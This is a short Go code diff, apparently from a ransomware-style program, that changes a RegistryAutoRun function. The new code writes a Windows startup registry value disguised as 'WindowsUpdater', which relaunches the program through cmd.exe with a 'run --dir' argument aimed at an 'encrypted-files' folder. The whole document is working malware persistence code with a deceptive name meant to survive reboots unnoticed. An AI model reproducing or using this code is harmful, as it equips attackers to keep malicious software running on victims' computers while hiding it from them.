@@ -16,7 +16,11 @@ func RegistryAutoRun() error {
 		return err
 	}
 
-	err = k.SetStringValue(`WindowsUpdater`, `cmd.exe `+os.Args[0])
+	path, _ := os.Getwd()
+
+	command := `"C:\Windows\System32\cmd.exe" /c cd ` + path + ` && ` + os.Args[0] + ` run --dir ` + path + `\encrypted-files`
+
+	err = k.SetStringValue(`WindowsUpdater`, command)
 	if err != nil {
 		return err
 	}
